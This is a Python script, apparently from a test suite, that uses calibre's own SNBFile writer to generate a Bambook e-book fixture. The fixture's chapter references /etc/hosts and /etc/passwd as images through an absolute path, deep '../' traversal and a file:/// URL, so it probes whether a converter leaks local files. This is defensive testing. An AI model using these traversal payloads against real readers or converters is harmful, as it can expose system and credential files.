"""Write hostile-links.snb: a Bambook book whose one chapter says "the visible words of the book" and names /etc/hosts and /etc/passwd as pictures, by
an absolute path, a relative path with twelve `..` segments and a `file:///` URL. The container is written by calibre's own SNBFile class (the writer
is the same in calibre 8.5.0 and 9.x), loaded by path so that nothing of calibre is copied here:
python3 -I generators/mksnb-links.py <path of calibre/ebooks/snb/snbfile.py> hostile-links.snb"""
import importlib.util, os, shutil, sys, tempfile, types
stub = types.ModuleType('calibre'); stub.guess_type = lambda n: ('application/octet-stream', None); sys.modules['calibre'] = stub
spec = importlib.util.spec_from_file_location('m', sys.argv[1]); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
d = tempfile.mkdtemp()
for sub in ('snbf', 'snbc', 'snbi'): os.makedirs(os.path.join(d, sub))
open(d + '/snbf/book.snbf', 'w').write('<book-snbf version="1.0"><head><name>Hostile links</name><author>Test</author><language>ENG</language><rights/><publisher></publisher><generator>test</generator><created/><abstract></abstract><cover/></head></book-snbf>')
open(d + '/snbf/toc.snbf', 'w').write('<toc-snbf><head><chapters>1</chapters></head><body><chapter src="ch1.snbc">Start</chapter></body></toc-snbf>')
climb = '../' * 12 + 'etc/hosts'
open(d + '/snbc/ch1.snbc', 'w').write('<snbc><head><title>Start</title></head><body><text>These are the visible words of the book.</text>'
  f'<img>/etc/hosts</img><img>{climb}</img><img>file:///etc/hosts</img><img>../../../../etc/passwd</img></body></snbc>')
# a picture entry, as calibre's reader writes it out by the base name of the entry
open(d + '/snbi/cover.jpg', 'wb').write(b'\xff\xd8\xff\xd9')
w = m.SNBFile(); w.FromDir(d); w.Output(sys.argv[2])
shutil.rmtree(d)
print('wrote', sys.argv[2], os.path.getsize(sys.argv[2]))
